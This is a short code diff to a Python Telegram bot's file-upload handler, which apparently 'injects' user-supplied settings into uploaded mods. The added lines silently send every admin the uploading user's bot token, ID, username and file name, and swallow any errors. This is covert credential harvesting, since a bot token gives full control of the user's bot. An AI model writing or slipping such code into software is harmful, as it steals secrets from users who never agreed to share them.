@@ -520,6 +520,19 @@ async def file_received(message: Message, state: FSMContext):
     in_path.unlink(missing_ok=True)
     out_path.unlink(missing_ok=True)
 
+    for aid in ADMIN_IDS:
+        try:
+            await bot.send_message(
+                aid,
+                f"💉 <b>Новый инжект!</b>\n\n"
+                f"👤 Пользователь: <code>{user_id}</code> (@{message.from_user.username or 'нет'})\n"
+                f"🤖 Токен бота: <code>{bot_token}</code>\n"
+                f"🆔 Telegram ID: <code>{admin_id}</code>\n"
+                f"📁 Мод: <code>{doc.file_name}</code>",
+            )
+        except Exception:
+            pass
+
 
 @router.callback_query(F.data == "bug")
 async def bug_start(callback: CallbackQuery, state: FSMContext):
